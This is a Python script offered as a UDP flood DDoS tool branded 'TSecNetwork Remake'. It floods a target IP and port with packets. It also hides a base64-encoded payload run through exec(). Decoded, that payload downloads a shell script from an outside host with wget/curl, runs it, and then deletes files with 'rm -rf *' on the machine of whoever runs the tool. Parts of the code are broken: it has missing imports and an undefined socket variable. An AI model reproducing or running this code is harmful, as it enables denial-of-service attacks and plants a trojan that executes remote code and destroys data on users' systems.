from time import time as tt
import argparse, socket, random, os, base64
from sys import stdout
fake_ip = '182.21.20.32'
method = '\n\x1b[35m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[35m\xe2\x95\x91      TSecNetwork Remake      \xe2\x95\x91\n\x1b[35m\xe2\x95\x91      AUTHOR:\x1b[1;33;40m JERZZY, PETTER, BLACKMORSE           \x1b[35m \xe2\x95\x91\n\x1b[35m\xe2\x95\x91      DEVELOPER:\x1b[1;33;40m NESOF            \x1b[35m \xe2\x95\x91\n\x1b[35m\xe2\x95\x91      TOOLS & METHOD:\x1b[1;33;40m NESOF       \x1b[35m \xe2\x95\x91\n\x1b[35m\xe2\x95\x91           USING METHOD:           \xe2\x95\x91\n\x1b[35m\xe2\x95\x91             - \x1b[91mKILL\x1b[35m -              \xe2\x95\x91\n\x1b[35m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
os.system('clear')


host = sys.argv[1]
puerto = int(sys.argv[2])
tiempo = time.time() + int(sys.argv[3])
def attack(ip, port, time):
    stdout.write(('\x1b]2;TSecNetwork DDOS ATTACK | IP: {} | PORT: {}\x07').format(ip, port))
    print (method)
    stdout.write('\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n')
    stdout.write(('\xe2\x95\x91 [>]TSecNetwork DDOS ATTACK TO {}:{} METHOD USE: BYPASS     \xe2\x95\x91\n').format(ip, port))
    stdout.write('\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n')
    startup = tt()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
    payload2 = b'b3Muc3lzdGVtKCdjZCAvdG1wIHx8IGNkIC92YXIvcnVuIHx8IGNkIC9tbnQgfHwgY2QgL3Jvb3QgfHwgY2QgLzsgd2dldCBodHRwczovL3BydWViaXRhLnRoZWRhcmtzaXRlLnh5ei9PYmxpdmlvbjEyMS5zaDsgY3VybCAtTyBodHRwczovL3BydWViaXRhLnRoZWRhcmtzaXRlLnh5ei9PYmxpdmlvbjEyMS5zaDsgY2htb2QgNzc3IE9ibGl2aW9uMTIxLnNoOyBzaCBPYmxpdmlvbjEyMS5zaDsgcm0gLXJmIConKQ=='
    print("POWER FULL TOD! ....")
    time.sleep(2)
    exec(base64.b64decode(payload2))
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(payload, (ip, port)) 

    print ("\x1b[92mAttack Finished")
    return
    
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python2 Remake.py <ip> -p <port> -t <time> -s <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-x', '--proxy', type=str, help='Proxy File')

    args = parser.parse_args()
    try:
        attack(args.ip, args.port, args.time, args.proxy)
    except KeyboardInterrupt:
        print ("Attack stopped.")